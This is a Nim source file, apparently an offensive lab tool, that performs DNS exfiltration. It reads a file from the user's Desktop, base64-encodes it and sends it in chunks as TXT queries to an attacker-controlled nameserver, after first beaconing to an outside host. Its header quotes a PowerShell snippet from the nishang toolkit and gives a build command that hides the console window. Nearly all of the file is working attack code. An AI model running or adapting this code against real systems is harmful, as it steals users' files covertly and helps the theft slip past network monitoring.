#[    
    Debug:
        nim c --d:mingw --d:debug --app=console DNSExfilCosmo.nim

    Release:
        nim c --d:mingw --d:release --app=gui --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off DNSExfilCosmo.nim

Inspired by: https://github.com/samratashok/nishang/blob/master/Utility/Do-Exfiltration.ps1
Something like this :
---
    elseif ($ExfilOption -eq "DNS")
    {
        $code = Compress-Encode
        $queries = [int]($code.Length/63)
        while ($queries -ne 0)
        {
            $querystring = $code.Substring($lengthofsubstr,63)
            Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $AuthNS"
            $lengthofsubstr += 63
            $queries -= 1
        }
        $mod = $code.Length%63
        $query = $code.Substring($code.Length - $mod, $mod)
        Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"
---
]#

import dnsclient
import os
from base64 import encode
import streams
import strutils
import osproc
import std/httpclient
import std/strformat
import std/random

const CHUNK_SIZE = 62


# Globals
var homeDir = getHomeDir()
let domainName = ".cosmosfurbootsemporium.local"
let authNS = "auth.ns.local"


proc hey_you_up(): bool = 
    var client = newHttpClient()
    var res =  client.request("http://hey.youup.local")
    let response = res.status
    if "200 OK" in response:
        echo "[*] Lub dub!"
        sleep (3000)
        return true


proc dnsExfilCosmo(): void =
    
    let target = homeDir & r"Desktop\cosmo.jpeg"
    var content = readFile(target)
    let b64 = encode(content, safe=true)

    var stringindex = 0

    while stringindex <= b64.len-1:
        try:
            var query =  b64[stringindex .. (if stringindex + CHUNK_SIZE - 1 > b64.len - 1: b64.len - 1 else: stringindex + CHUNK_SIZE - 1)]
            let client = newDNSClient(authNS)
            var dnsquery = query & domainName
            let resp = client.sendQuery(dnsquery, TXT)
            stringindex += CHUNK_SIZE
            sleep(10)
        except:
            quit(0)


when isMainModule:
    var u_up = true
    while u_up == true:
        try:
            var u_up = hey_you_up()
        except:
            break
    try:
        dnsExfilCosmo()
    except:
        quit()
    finally:
        quit()
    dnsExfilCosmo()

